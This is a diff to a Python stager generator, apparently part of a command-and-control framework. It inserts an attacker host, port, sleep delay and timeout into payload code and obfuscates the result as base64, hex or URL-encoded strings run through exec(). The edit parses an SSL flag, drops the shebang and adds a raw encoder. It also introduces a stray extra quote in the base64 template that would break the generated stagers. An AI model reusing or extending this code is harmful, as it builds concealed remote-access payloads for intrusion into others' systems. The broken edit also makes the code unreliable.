@@ -57,7 +57,7 @@ def get_stager(id: str, encoder: str = "base64", random_size : bool = False, tim
     # Get Config Data
     address = config["address"]
     port = config["port"]
-    ssl = config["ssl"]
+    ssl = True if str(config["ssl"]).lower() == "true" else False
     
 
     # Get the Payload from the File
@@ -80,14 +80,13 @@ def get_stager(id: str, encoder: str = "base64", random_size : bool = False, tim
         end = ""
     
     # Replace the Payload
-    finished_payload = "#!/usr/bin/env python3" "\n"
-    finished_payload +=  start + "\n"
+    finished_payload =  start + "\n"
     finished_payload += f"import time\ntime.sleep({delay})\nHOST = '{address}'\nPORT = {port}\nTIMEOUT = {timeout}\nssl={ssl}"
     finished_payload += payload + "\n" + end
 
     # Encode the Payload
     if encoder == "base64":
-        finished_payload = """import base64;exec(base64.b64decode(b'%s'))""" % base64.b64encode(
+        finished_payload = """"import base64;exec(base64.b64decode(b'%s'))""" % base64.b64encode(
             finished_payload.encode()).decode()
     elif encoder == "hex":
         finished_payload = """from binascii import unhexlify;exec(unhexlify('%s'))""" % hexlify(
@@ -95,6 +94,8 @@ def get_stager(id: str, encoder: str = "base64", random_size : bool = False, tim
     elif encoder == "url":
         finished_payload = """import urllib.parse;exec(urllib.parse.unquote('%s'))""" % urllib.parse.quote(
             finished_payload)
+    elif encoder == "raw":
+        pass
     else:
         raise Exception("Encoder not supported")
     
